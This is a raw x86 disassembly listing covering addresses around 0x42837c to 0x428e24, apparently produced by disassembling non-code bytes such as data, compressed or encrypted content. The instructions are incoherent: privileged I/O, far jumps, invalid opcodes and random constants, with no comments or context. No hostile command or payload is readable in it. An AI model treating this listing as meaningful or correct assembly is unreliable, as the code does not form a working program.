  42837c:	aad    0x7c
  42837e:	repnz add al,0x28
  428381:	inc    ecx
  428382:	cdq    
  428383:	mov    cl,0x7d
  428385:	mov    BYTE PTR [ebx+0x5c],0x64
  428389:	imul   ecx,ebx,0xfffffff4
  42838c:	and    ah,BYTE PTR [esi-0x19]
  42838f:	push   edx
  428390:	daa    
  428391:	push   esp
  428392:	and    al,0xad
  428394:	inc    eax
  428395:	ror    dh,cl
  428397:	in     eax,0xe4
  428399:	and    DWORD PTR [esi+edx*1-0x63],ebp
  42839d:	dec    esp
  42839e:	dec    edi
  42839f:	rcr    al,0xf9
  4283a2:	xlat   BYTE PTR ds:[ebx]
  4283a3:	mov    esp,0xf703ff09
  4283a8:	mov    esp,0xec19a414
  4283ad:	cmp    bl,BYTE PTR [esi-0x466c1476]
  4283b3:	and    edx,DWORD PTR [edx+0x5947647f]
  4283b9:	scas   eax,DWORD PTR es:[edi]
  4283ba:	fst    DWORD PTR [edi]
  4283bc:	xor    eax,0x4e5ef71
  4283c1:	ja     0x428410
  4283c3:	mov    edx,0x2751ed16
  4283c8:	inc    ebx
  4283c9:	aaa    
  4283ca:	test   BYTE PTR [ebp-0x5d94a5c6],bl
  4283d0:	lahf   
  4283d1:	fld    QWORD PTR [edi+0x7c90a55d]
  4283d7:	jns    0x4283b7
  4283d9:	mov    al,ds:0x58e2f353
  4283de:	add    BYTE PTR [eax+0x78],cl
  4283e1:	test   BYTE PTR [eax+0x25],0x9
  4283e5:	out    0xf4,eax
  4283e7:	dec    ebp
  4283e8:	pop    edi
  4283e9:	jno    0x42842b
  4283eb:	jp     0x4283bd
  4283ed:	inc    ebp
  4283ee:	fs mov edx,?
  4283f1:	retf   
  4283f2:	or     DWORD PTR [esi-0x3e],0xffffffee
  4283f6:	shl    dh,cl
  4283f8:	jmp    0x72ad:0x3344b79f
  4283ff:	add    bl,ah
  428401:	jmp    0xb378:0x54d1ddef
  428408:	hlt    
  428409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42840a:	cmp    ch,al
  42840c:	adc    eax,0x3fd92bd3
  428411:	cwde   
  428412:	out    dx,eax
  428413:	outs   dx,DWORD PTR ds:[esi]
  428414:	cmp    BYTE PTR ds:0xe78b6281,ch
  42841a:	mov    dl,0xaf
  42841c:	sub    cl,BYTE PTR [edx+esi*8+0x14]
  428420:	bound  ebx,QWORD PTR [ecx-0x71]
  428423:	pop    ebx
  428424:	xor    eax,0x63591888
  428429:	add    bl,ch
  42842b:	or     BYTE PTR [esi+0x53],0x25
  42842f:	xor    al,0x5b
  428431:	shr    BYTE PTR [eax+0x67],1
  428434:	cmp    al,0x2a
  428436:	adc    DWORD PTR [edx],ebp
  428438:	dec    ebp
  428439:	mov    edx,ebx
  42843b:	std    
  42843c:	mov    ebp,DWORD PTR [eax+0x9da09f]
	...
  4284b2:	add    BYTE PTR [eax],al
  4284b4:	pop    esp
  4284b5:	test   al,0xc0
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx-0x2b94cbf9]
  4284c1:	popf   
  4284c2:	stos   BYTE PTR es:[edi],al
  4284c3:	push   esi
  4284c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284c5:	stos   DWORD PTR es:[edi],eax
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	cmc    
  4284c9:	add    BYTE PTR [eax],al
  4284cb:	add    BYTE PTR [edi-0x39],al
  4284ce:	cmp    DWORD PTR [ebx+0x6c82f377],ecx
  4284d4:	or     edi,esi
  4284d6:	daa    
  4284d7:	out    0x4e,eax
  4284d9:	cmp    BYTE PTR [edx+0xbf07e88],0x1d
  4284e0:	cdq    
  4284e1:	inc    ebp
  4284e2:	sub    cl,BYTE PTR [ebx+ecx*1]
  4284e5:	push   esp
  4284e6:	dec    esi
  4284e7:	jge    0x428472
  4284e9:	scas   al,BYTE PTR es:[edi]
  4284ea:	pushf  
  4284eb:	inc    ebp
  4284ec:	pop    es
  4284ed:	dec    ebx
  4284ee:	and    eax,0xcfebdb21
  4284f3:	dec    ecx
  4284f4:	rcr    DWORD PTR [esi-0x66c981b7],0x2a
  4284fb:	pop    eax
  4284fc:	mov    esi,0xa0974813
  428501:	inc    edx
  428502:	iret   
  428503:	fnstsw WORD PTR [edi]
  428505:	xor    cl,BYTE PTR [eax]
  428507:	les    eax,FWORD PTR [esi-0x11]
  42850a:	sbb    BYTE PTR [edx-0x754050aa],bh
  428510:	xchg   ebx,eax
  428511:	fisubr WORD PTR [ecx-0x6b4edff1]
  428517:	div    esp
  428519:	xchg   ebx,eax
  42851a:	mov    ebp,0x43d90c23
  42851f:	test   BYTE PTR [ebx+0x45],dl
  428522:	sbb    al,al
  428524:	dec    esp
  428525:	jb     0x4284c6
  428527:	(bad)  
  428528:	jbe    0x4284c1
  42852a:	imul   esp,DWORD PTR [ecx],0x93898821
  428530:	repnz sub al,0x2a
  428533:	or     al,0x1c
  428535:	in     eax,dx
  428536:	ret    0x2f25
  428539:	cmp    bl,bh
  42853b:	xchg   ebx,eax
  42853c:	cmp    al,0x45
  42853e:	mov    DWORD PTR [eax],edi
  428540:	retf   
  428541:	push   ebp
  428542:	leave  
  428543:	sub    DWORD PTR [ebx-0x74dcb124],esi
  428549:	jge    0x42855f
  42854b:	sar    DWORD PTR [esi+0x5b],1
  42854e:	inc    esp
  42854f:	and    edi,DWORD PTR [ebx]
  428551:	ja     0x4285c4
  428553:	neg    DWORD PTR [esi]
  428555:	je     0x4284d7
  428557:	pop    esp
  428558:	pavgb  mm6,QWORD PTR ds:0x5db782ad
  42855f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428560:	mov    eax,0x828d9943
  428565:	xchg   edx,eax
  428566:	jnp    0x42857c
  428568:	pop    edx
  428569:	scas   eax,DWORD PTR es:[edi]
  42856a:	pop    ebp
  42856b:	cmp    BYTE PTR [edi+0x9],cl
  42856e:	add    ch,BYTE PTR [ebp-0x340adbe7]
  428574:	and    DWORD PTR [edx+0x26],0xf4be3c98
  42857b:	xchg   ebx,eax
  42857c:	jmp    0x4285ed
  42857e:	mov    edx,0xbdfb353f
  428583:	daa    
  428584:	mov    al,0x5d
  428586:	int    0x4
  428588:	cmp    esi,DWORD PTR [eax-0xc]
  42858b:	push   0xc37c4dc0
  428590:	push   ecx
  428591:	xchg   ebp,eax
  428592:	imul   esi,DWORD PTR [eax-0x2d317612],0xffffff8b
  428599:	sbb    BYTE PTR [ebp-0x53],al
  42859c:	pop    es
  42859d:	add    DWORD PTR [esi],ebx
  42859f:	jno    0x428572
  4285a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285a2:	sahf   
  4285a3:	add    DWORD PTR [edi],ebx
  4285a5:	mov    eax,?
  4285a7:	adc    eax,0xfd2d10a0
  4285ac:	pop    edx
  4285ad:	mov    esp,0x5e4315d4
  4285b2:	hlt    
  4285b3:	push   ss
  4285b4:	and    al,0x83
  4285b6:	jge    0x4285e3
  4285b8:	rcl    esp,1
  4285ba:	push   cs
  4285bb:	mov    ch,BYTE PTR [edx+0x40d598f8]
	...
  428631:	add    BYTE PTR [eax],al
  428633:	add    BYTE PTR [ecx],al
  428635:	push   esi
  428636:	nop
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	inc    ebx
  428641:	mov    ds:0xac9ccfcd,al
  428646:	add    DWORD PTR [eax],eax
  428648:	cmc    
  428649:	add    BYTE PTR [eax],al
  42864b:	add    BYTE PTR [edi+0x7970887],cl
  428651:	cmp    al,0x71
  428653:	shr    ebp,1
  428655:	in     al,dx
  428656:	(bad)  
  428657:	shr    DWORD PTR [esi+0x5c],1
  42865a:	retf   0x697b
  42865d:	popf   
  42865e:	xchg   esp,edi
  428660:	xchg   esi,eax
  428661:	fistp  WORD PTR [esi-0x37304fd]
  428667:	and    bl,BYTE PTR [ecx+0x302a84f4]
  42866d:	retf   
  42866e:	jmp    0x428607
  428670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428671:	cld    
  428672:	ds inc edx
  428674:	aaa    
  428675:	jbe    0x4286be
  428677:	add    ebx,ecx
  428679:	add    dh,bh
  42867b:	adc    al,0x9
  42867d:	cmp    DWORD PTR [edx-0x56],ecx
  428680:	int    0x6a
  428682:	mov    ebx,0x594dd8ef
  428687:	into   
  428688:	pop    eax
  428689:	fnsave [esi]
  42868b:	push   ss
  42868c:	into   
  42868d:	pop    ss
  42868e:	(bad)
  428691:	push   0xd3d7e534
  428696:	std    
  428697:	sbb    BYTE PTR [edi],al
  428699:	retf   
  42869a:	outs   dx,DWORD PTR ds:[esi]
  42869b:	xchg   esi,eax
  42869c:	cmp    al,0x27
  42869e:	xor    ebx,DWORD PTR [edx+esi*2]
  4286a1:	aam    0x57
  4286a3:	iret   
  4286a4:	pop    ecx
  4286a5:	out    dx,al
  4286a6:	xor    eax,0xac69e720
  4286ab:	pop    esi
  4286ac:	mov    eax,ds:0x357216d7
  4286b1:	(bad)  
  4286b2:	xor    bh,ah
  4286b4:	data16 out 0xfb,al
  4286b7:	adc    edx,DWORD PTR ds:0xbf9424c1
  4286bd:	mov    bl,0x8b
  4286bf:	(bad)  
  4286c0:	pop    eax
  4286c1:	push   ebx
  4286c2:	mov    ch,0xd4
  4286c4:	out    dx,al
  4286c5:	xchg   esp,eax
  4286c6:	mov    ecx,esp
  4286c8:	mov    eax,ds:0x88bbf839
  4286cd:	and    DWORD PTR [ebp+0x7b],0x71d37dcb
  4286d4:	enter  0x989e,0x5c
  4286d8:	pop    esp
  4286d9:	lods   al,BYTE PTR ds:[esi]
  4286da:	pop    ss
  4286db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286dc:	fisub  WORD PTR [edx-0xa]
  4286df:	cmp    DWORD PTR [ecx-0x35aa0cd8],eax
  4286e5:	clc    
  4286e6:	pusha  
  4286e7:	(bad)  
  4286e8:	outs   dx,DWORD PTR ds:[esi]
  4286e9:	cmp    DWORD PTR [edi],ecx
  4286eb:	imul   esi,DWORD PTR ds:0x62cae46a,0xfffffff7
  4286f2:	pop    ebp
  4286f3:	mov    WORD PTR [edx+0x44],es
  4286f6:	mov    eax,0x9b91109f
  4286fb:	scas   al,BYTE PTR es:[edi]
  4286fc:	or     al,0xdb
  4286fe:	cli    
  4286ff:	popa   
  428700:	js     0x4286da
  428702:	mov    gs,WORD PTR ds:0x63b5931a
  428708:	cmp    ebp,DWORD PTR [eax-0x79]
  42870b:	cdq    
  42870c:	adc    ah,BYTE PTR [ecx]
  42870e:	adc    ch,BYTE PTR [edi-0x5e6923f5]
  428714:	sbb    DWORD PTR [ebp+0x12910657],ecx
  42871a:	dec    esp
  42871b:	or     eax,0xb085c3b6
  428720:	ficom  DWORD PTR [edx*8+0x6899dab]
  428727:	inc    edi
  428728:	or     DWORD PTR [ebp-0x1e],0x47bfab77
  42872f:	adc    al,BYTE PTR [ebp-0x5a9a7e43]
  428735:	and    ecx,DWORD PTR [edi+0x1edc1916]
  42873b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42873c:	sahf   
  42873d:	inc    esp
  42873e:	jae    0x4287bf
  428740:	fild   DWORD PTR [eax]
	...
  4287b2:	add    BYTE PTR [eax],al
  4287b4:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4287ba:	pop    esi
  4287bb:	fbstp  TBYTE PTR [ebx]
  4287bd:	mov    edx,0xaf8299e
  4287c2:	lds    esp,FWORD PTR [eax]
  4287c4:	xchg   ecx,eax
  4287c5:	lods   eax,DWORD PTR ds:[esi]
  4287c6:	add    DWORD PTR [eax],eax
  4287c8:	cmc    
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [esi+0x4dcbbff3],ch
  4287d1:	adc    dh,BYTE PTR [edi-0xc]
  4287d4:	scas   al,BYTE PTR es:[edi]
  4287d5:	clc    
  4287d6:	shl    WORD PTR [eax],0x9
  4287da:	arpl   WORD PTR [edi+0x5c],sp
  4287dd:	push   cs
  4287de:	push   0x67
  4287e0:	daa    
  4287e1:	pop    ds
  4287e2:	add    bl,BYTE PTR [ebx+edx*2]
  4287e5:	pop    edx
  4287e6:	arpl   WORD PTR [edx+0xd],bx
  4287e9:	mov    DWORD PTR [edx-0x4e28d072],esi
  4287ef:	mov    ebx,0xf95cea8c
  4287f4:	mov    ds:0x641858b1,eax
  4287f9:	nop
  4287fa:	pop    edx
  4287fb:	ror    BYTE PTR [edx],0x95
  4287fe:	ja     0x428836
  428800:	add    DWORD PTR [ebx-0x59],eax
  428803:	mov    eax,0xacd80b36
  428808:	clc    
  428809:	mov    bh,0x10
  42880b:	mov    ah,0xde
  42880d:	push   esp
  42880e:	mov    edx,0xbfd6dbee
  428813:	pop    ds
  428814:	imul   esi
  428816:	shl    BYTE PTR [ebp-0x30755589],0x37
  42881d:	adc    al,0x72
  42881f:	xor    eax,0x3353c68d
  428824:	lods   al,BYTE PTR ds:[esi]
  428825:	fcom   QWORD PTR [ebp+0x70]
  428828:	xchg   DWORD PTR [edi+ecx*4+0x40],ebp
  42882c:	cmp    BYTE PTR [edi+0x15],bl
  42882f:	cld    
  428830:	lds    edi,FWORD PTR ss:[ebp-0x28738d11]
  428837:	mov    dh,0x2a
  428839:	test   BYTE PTR [edx+0x5b],0x69
  42883d:	pushf  
  42883e:	and    DWORD PTR [ebp-0x66],ecx
  428841:	xchg   esi,eax
  428842:	mov    dh,0xd8
  428844:	adc    BYTE PTR [ecx+esi*8+0x5a],0x74
  428849:	out    dx,al
  42884a:	adc    DWORD PTR [ecx+0x63],eax
  42884d:	jl     0x428834
  42884f:	push   ss
  428850:	outs   dx,DWORD PTR ds:[esi]
  428851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428852:	iret   
  428853:	xchg   cl,al
  428855:	jl     0x42886e
  428857:	mov    bh,0x48
  428859:	jp     0x428861
  42885b:	popf   
  42885c:	jbe    0x428883
  42885e:	imul   edx,DWORD PTR [eax-0x6b],0x26
  428862:	and    dh,ch
  428864:	or     dh,BYTE PTR [esi+0x4c]
  428867:	pop    eax
  428868:	inc    eax
  428869:	test   eax,0x843a28a
  42886e:	in     eax,dx
  42886f:	arpl   WORD PTR [ebp-0x1],dx
  428872:	mov    ch,0xec
  428874:	retf   0xaaea
  428877:	ss wbinvd 
  42887a:	dec    eax
  42887b:	mov    dh,0x2e
  42887d:	mov    DWORD PTR [edi-0x73],ecx
  428880:	int    0x7e
  428882:	mov    ecx,0x3dd7106d
  428887:	outs   dx,DWORD PTR cs:[esi]
  428889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42888a:	retf   0xcb18
  42888d:	mov    ds:0x8d62cb2f,eax
  428892:	jle    0x428824
  428894:	stc    
  428895:	scas   eax,DWORD PTR es:[edi]
  428896:	retf   0x1da0
  428899:	das    
  42889a:	jp     0x428877
  42889c:	jae    0x428863
  42889e:	pusha  
  42889f:	int    0xd
  4288a1:	cld    
  4288a2:	cmp    al,0xc
  4288a4:	xchg   ebp,eax
  4288a5:	mov    al,ds:0xd34b4191
  4288aa:	pop    esi
  4288ab:	adc    bh,BYTE PTR [edi]
  4288ad:	call   0x50d2:0x830cfe48
  4288b4:	sbb    eax,0x51dc520
  4288b9:	adc    BYTE PTR [esi],dh
  4288bb:	xchg   ebx,eax
  4288bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288bd:	pop    esi
  4288be:	sbb    eax,0x34a
	...
  428933:	add    BYTE PTR [edx-0x5c0023],bl
  428939:	mov    ds:0x79f8fdde,eax
  42893e:	ja     0x42892a
  428940:	mov    esi,0x86b07c1b
  428945:	scas   al,BYTE PTR es:[edi]
  428946:	add    DWORD PTR [eax],eax
  428948:	cmc    
  428949:	add    BYTE PTR [eax],al
  42894b:	add    ch,bl
  42894d:	cmp    DWORD PTR [ecx+edx*4-0x7],ebp
  428951:	mov    es,WORD PTR [esi+ebx*4]
  428954:	fisttp WORD PTR [eax+0x5d]
  428957:	mov    dl,0x4c
  428959:	jb     0x428932
  42895b:	add    bl,BYTE PTR [edx]
  42895d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42895e:	jnp    0x4289c8
  428960:	fwait
  428961:	xor    eax,0x9b774bdf
  428966:	jbe    0x42897d
  428968:	jl     0x4289a1
  42896a:	or     al,0x6
  42896c:	mov    ds:0x56f9da6c,al
  428971:	jmp    0x4289a0
  428973:	xchg   BYTE PTR [edi+0x5d],ah
  428976:	jmp    DWORD PTR [edx]
  428978:	push   0x552740b5
  42897d:	rcr    cl,1
  42897f:	xchg   DWORD PTR ds:[esi+0xda109c4],eax
  428986:	les    esp,FWORD PTR [esi+edx*4-0x4e5ad58b]
  42898d:	xor    ebp,esi
  42898f:	cmp    BYTE PTR [eax+0x2b],0x4a
  428993:	lock rol DWORD PTR [edi],1
  428996:	and    bl,BYTE PTR [eax+ebx*1+0x22]
  42899a:	xor    DWORD PTR [ecx],ebx
  42899c:	jns    0x428961
  42899e:	in     eax,0x8d
  4289a0:	sub    edx,edi
  4289a2:	and    BYTE PTR [edx+0x4b],ah
  4289a5:	leave  
  4289a6:	jg     0x4289e9
  4289a8:	jmp    0x928a2905
  4289ad:	sbb    al,0x3e
  4289af:	sub    al,cl
  4289b1:	mov    BYTE PTR [ebx-0x5e],dl
  4289b4:	out    0xf7,eax
  4289b6:	xor    BYTE PTR [edi-0x54],dl
  4289b9:	dec    eax
  4289ba:	pop    esi
  4289bb:	stc    
  4289bc:	cmp    edx,DWORD PTR [ebx+edx*8]
  4289bf:	xchg   ebp,eax
  4289c0:	cmp    BYTE PTR [ecx-0x35],dh
  4289c3:	ins    BYTE PTR es:[edi],dx
  4289c4:	jb     0x428964
  4289c6:	mov    ah,0xb1
  4289c8:	push   edi
  4289c9:	pushf  
  4289ca:	cmp    edi,esi
  4289cc:	retf   0x21af
  4289cf:	push   0x41
  4289d1:	outs   dx,BYTE PTR ds:[esi]
  4289d2:	jbe    0x428978
  4289d4:	dec    ebp
  4289d5:	cmp    al,0x62
  4289d7:	cmc    
  4289d8:	punpckhwd mm2,QWORD PTR [esi-0x3c5e10fa]
  4289df:	repz inc edx
  4289e1:	push   ds
  4289e2:	push   esp
  4289e3:	push   0x13
  4289e5:	and    eax,0x67528079
  4289ea:	call   0xddac9dfe
  4289ef:	xchg   ebp,ecx
  4289f1:	cwde   
  4289f2:	repz lahf 
  4289f4:	and    DWORD PTR [edi],ecx
  4289f6:	ror    edi,0x9
  4289f9:	stc    
  4289fa:	ss (bad) 
  4289fc:	xor    DWORD PTR [eax-0x40],eax
  4289ff:	sbb    BYTE PTR [eax+eiz*8+0x3b84b8b5],0x5
  428a07:	jl     0x4289fe
  428a09:	push   ss
  428a0a:	loop   0x428a82
  428a0c:	push   esi
  428a0d:	or     ch,BYTE PTR ds:0x12c4fd4a
  428a13:	cwde   
  428a14:	pop    edx
  428a15:	(bad)  
  428a17:	in     eax,dx
  428a18:	pop    eax
  428a19:	lods   al,BYTE PTR ds:[esi]
  428a1a:	inc    ebx
  428a1b:	sti    
  428a1c:	mov    ebp,0x606dcc90
  428a21:	fdivr  QWORD PTR [edx-0x1c]
  428a24:	es dec ecx
  428a26:	pusha  
  428a27:	cmc    
  428a28:	retf   0xd6b9
  428a2b:	xchg   esi,eax
  428a2c:	cmp    BYTE PTR [edi],bl
  428a2e:	jecxz  0x428a97
  428a30:	rsqrtps xmm3,XMMWORD PTR [edx-0x6d79b488]
  428a37:	xor    DWORD PTR [ebx-0x66],eax
  428a3a:	pop    esi
  428a3b:	cld    
  428a3c:	rdpmc  
  428a3e:	out    dx,al
  428a3f:	dec    bh
	...
  428ab1:	add    BYTE PTR [eax],al
  428ab3:	add    dl,cl
  428ab5:	mov    edx,DWORD PTR [edx+0x7b]
  428ab8:	push   ebx
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x6a1af691
  428ac2:	mov    WORD PTR [edi+0x1af7b],es
  428ac8:	cmc    
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    BYTE PTR [edx-0x80],dl
  428ace:	push   esi
  428acf:	sub    al,0xd3
  428ad1:	loopne 0x428b46
  428ad3:	xchg   esi,eax
  428ad4:	(bad)  
  428ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ad6:	test   DWORD PTR [ebp+0x53],0x359c60cc
  428add:	dec    eax
  428ade:	repz sbb al,ch
  428ae1:	ins    BYTE PTR es:[edi],dx
  428ae2:	mov    ss,WORD PTR [esi]
  428ae4:	add    ah,BYTE PTR [esi]
  428ae6:	in     eax,dx
  428ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ae8:	xor    DWORD PTR [esp+ebx*4-0x1f269510],ebp
  428aef:	pop    edx
  428af0:	jmp    0x34a644a2
  428af5:	mov    cl,0x4b
  428af7:	sbb    eax,0x63501bd9
  428afc:	push   ss
  428afd:	or     eax,0xda809db3
  428b02:	outs   dx,BYTE PTR ds:[esi]
  428b03:	cmp    DWORD PTR [ebx-0x21],edi
  428b06:	mov    ch,0x91
  428b08:	inc    ebx
  428b09:	fadd   st(7),st
  428b0b:	retf   0x59b6
  428b0e:	enter  0x2636,0xbc
  428b12:	imul   ebp,DWORD PTR [ebx-0x36],0x0
  428b16:	sub    edi,eax
  428b18:	inc    esi
  428b19:	into   
  428b1a:	mov    al,0x2c
  428b1c:	nop
  428b1d:	cmp    BYTE PTR [eax+0x15],dl
  428b20:	adc    eax,edi
  428b22:	mov    ds:0xac8a9da9,eax
  428b27:	cmp    al,0x84
  428b29:	adc    BYTE PTR [esi+0x2f0f9cfd],bl
  428b2f:	add    BYTE PTR [ecx+0x40333634],ah
  428b35:	jmp    0x38308bd
  428b3a:	icebp  
  428b3b:	add    al,0xf7
  428b3d:	arpl   WORD PTR [ecx],dx
  428b3f:	out    dx,eax
  428b40:	cmp    ah,BYTE PTR [eax+0x6]
  428b43:	loope  0x428b9c
  428b45:	jl     0x428bc0
  428b47:	adc    DWORD PTR [esi+0x6f],eax
  428b4a:	ret    
  428b4b:	push   ecx
  428b4c:	push   0xffffff9b
  428b4e:	je     0x428b6d
  428b50:	or     eax,DWORD PTR [ecx+0x91b49c2]
  428b56:	sbb    DWORD PTR [ebp-0x4d],esi
  428b59:	jge    0x428b42
  428b5b:	sti    
  428b5c:	jle    0x428ba0
  428b5e:	sub    al,0xed
  428b60:	sti    
  428b61:	jae    0x428b90
  428b63:	(bad)  
  428b65:	(bad)  
  428b66:	retf   
  428b67:	mov    eax,ds:0x79c911d9
  428b6c:	adc    BYTE PTR [eax],dh
  428b6e:	or     al,0x5b
  428b70:	jae    0x428b06
  428b72:	aas    
  428b73:	mov    ds:0x438bb383,al
  428b78:	leave  
  428b79:	imul   edi,ecx,0x19
  428b7c:	bound  ebx,QWORD PTR [ecx-0x1]
  428b7f:	nop
  428b80:	xchg   ebp,eax
  428b81:	mov    BYTE PTR [ecx-0x2293efeb],ch
  428b87:	mov    ebx,0x916bb85b
  428b8c:	in     al,0xcb
  428b8e:	cdq    
  428b8f:	push   ebp
  428b90:	fs pop esp
  428b92:	mov    ch,0x6d
  428b94:	(bad)  
  428b95:	int3   
  428b96:	jge    0x428b83
  428b98:	fs inc ecx
  428b9a:	and    edi,DWORD PTR [esi+0x2ca9390e]
  428ba0:	dec    esp
  428ba1:	mov    eax,ds:0x1de06d59
  428ba6:	shl    ebp,1
  428ba8:	ins    DWORD PTR es:[edi],dx
  428ba9:	shr    BYTE PTR [ecx-0xb73a64d],0x8c
  428bb0:	xor    ah,dl
  428bb2:	clc    
  428bb3:	xchg   edx,eax
  428bb4:	jmp    0x428bdb
  428bb6:	popf   
  428bb7:	std    
  428bb8:	in     al,0x21
  428bba:	mov    edi,0x9334d70e
  428bbf:	or     DWORD PTR [edi],esi
	...
  428c31:	add    BYTE PTR [eax],al
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x9fd7a28f
  428c41:	dec    ebp
  428c42:	cmp    bl,BYTE PTR [ecx+0x1b070]
  428c48:	cmc    
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [edx+0x7bb2a432],ch
  428c51:	pop    esp
  428c52:	and    eax,0xfc56295d
  428c57:	bnd jo 0x428ca9
  428c5a:	lea    ebx,[ebp+0x30bf297a]
  428c60:	(bad)  
  428c61:	xchg   bp,ax
  428c63:	push   es
  428c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c65:	dec    edi
  428c66:	retf   0x25f8
  428c69:	sbb    dh,dl
  428c6b:	dec    eax
  428c6c:	cmp    DWORD PTR [ecx-0x1357e9fa],ebx
  428c72:	sub    DWORD PTR [eax-0x7e0863e6],ecx
  428c78:	sbb    BYTE PTR [ebx+ebx*4+0x19],dh
  428c7c:	mov    edx,0x622c6330
  428c81:	cmp    al,0x94
  428c83:	scas   eax,DWORD PTR es:[edi]
  428c84:	outs   dx,DWORD PTR ds:[esi]
  428c85:	popa   
  428c86:	cmp    DWORD PTR [edx-0x27b85ca1],ebp
  428c8c:	(bad)  
  428c8d:	sub    eax,0x23d4d6bd
  428c92:	jl     0x428c53
  428c94:	pop    ebp
  428c95:	push   eax
  428c96:	pop    es
  428c97:	cmp    dl,BYTE PTR [ebp+edx*2+0x5c]
  428c9b:	pop    ecx
  428c9c:	leave  
  428c9d:	push   0x3e05e08e
  428ca2:	loop   0x428cde
  428ca4:	outs   dx,DWORD PTR ds:[esi]
  428ca5:	(bad)  
  428ca6:	jmp    0x6aff0a7b
  428cab:	int3   
  428cac:	jle    0x428c7e
  428cae:	(bad)  
  428caf:	imul   esi,ecx,0xffffffea
  428cb2:	cwde   
  428cb3:	mov    ah,0xf0
  428cb5:	pop    ebx
  428cb6:	xor    eax,0x2f54209b
  428cbb:	push   eax
  428cbc:	mov    al,ds:0xb816680e
  428cc1:	aas    
  428cc2:	mov    ds:0x61a692f0,al
  428cc7:	fidivr DWORD PTR [ebx+ebp*8-0x6a164d37]
  428cce:	fadd   st,st(0)
  428cd0:	inc    esi
  428cd1:	cmp    al,0x67
  428cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cd4:	dec    ecx
  428cd5:	add    esp,DWORD PTR [eax]
  428cd7:	mov    eax,0xbf9a7126
  428cdc:	inc    esi
  428cdd:	or     DWORD PTR [esi],0x2b298be3
  428ce3:	int3   
  428ce4:	inc    ebp
  428ce5:	mov    ecx,0x6ecb9b96
  428cea:	add    ch,BYTE PTR [edx+0x5e]
  428ced:	or     BYTE PTR [ebx],ah
  428cef:	dec    esi
  428cf0:	cmp    al,0xce
  428cf2:	push   0xbf5c091e
  428cf7:	xor    BYTE PTR [edx+0x6c],bl
  428cfa:	fst    DWORD PTR [ebx+0x28]
  428cfd:	inc    ebx
  428cfe:	or     BYTE PTR [edx*2-0x3bc2f172],al
  428d05:	mov    edi,DWORD PTR [eax]
  428d07:	xchg   eax,ebp
  428d09:	push   esi
  428d0a:	xor    bh,ah
  428d0c:	test   al,al
  428d0e:	and    DWORD PTR [edx+0x34bf9f3d],0xfffffffe
  428d15:	adc    DWORD PTR [eax],0x64f6ba60
  428d1b:	sbb    eax,0xcfaecaf8
  428d20:	push   ebp
  428d21:	mov    edi,0x401134
  428d26:	push   esi
  428d27:	jno    0x428cb4
  428d29:	or     BYTE PTR [edi-0x4f],bl
  428d2c:	in     al,0xbf
  428d2e:	fstp   st(0)
  428d30:	test   al,0xc1
  428d32:	push   edx
  428d33:	adc    edx,0xffffffae
  428d36:	xlat   BYTE PTR ds:[ebx]
  428d37:	pushf  
  428d38:	and    al,0x26
  428d3a:	stc    
  428d3b:	(bad)  
  428d3c:	xor    ah,BYTE PTR [ebx]
  428d3e:	test   eax,0x8a13
	...
  428db3:	add    BYTE PTR [eax+0x6d3c25f1],bh
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0x27724f0a
  428dc4:	gs mov cl,0x1
  428dc7:	add    ch,dh
  428dc9:	add    BYTE PTR [eax],al
  428dcb:	add    BYTE PTR [ecx],bh
  428dcd:	sub    dh,BYTE PTR [eax-0x83b47ef]
  428dd3:	push   ebx
  428dd4:	fwait
  428dd5:	xor    al,0xe
  428dd7:	pop    ds
  428dd8:	aaa    
  428dd9:	mov    ebp,0x3b7f57e0
  428dde:	loop   0x428de2
  428de0:	push   ebx
  428de1:	or     eax,0xf48c56e5
  428de6:	inc    esi
  428de7:	push   ecx
  428de8:	push   ss
  428de9:	adc    eax,0xcb8b6967
  428dee:	lods   eax,DWORD PTR ds:[esi]
  428def:	inc    edi
  428df0:	gs es xchg esi,eax
  428df3:	mov    BYTE PTR [edi+eiz*2+0x36],al
  428df7:	mov    esp,0xc62bc8c5
  428dfc:	arpl   WORD PTR [ebx+0x53],sp
  428dff:	lock jle 0x428e54
  428e02:	or     eax,0x304687fe
  428e07:	fbld   TBYTE PTR [ebx+0x2693d900]
  428e0d:	(bad)  [ebx-0x2]
  428e10:	or     ecx,DWORD PTR [esi-0x746758fe]
  428e16:	pop    ebx
  428e17:	out    dx,eax
  428e18:	iret   
  428e19:	aaa    
  428e1a:	pop    ss
  428e1b:	clc    
  428e1c:	pop    esi
  428e1d:	out    dx,al
  428e1e:	dec    eax
  428e1f:	(bad)  
  428e20:	popa   
  428e21:	pop    esp
  428e22:	inc    esp
  428e23:	das    
  428e24:	jg     0x428e3f
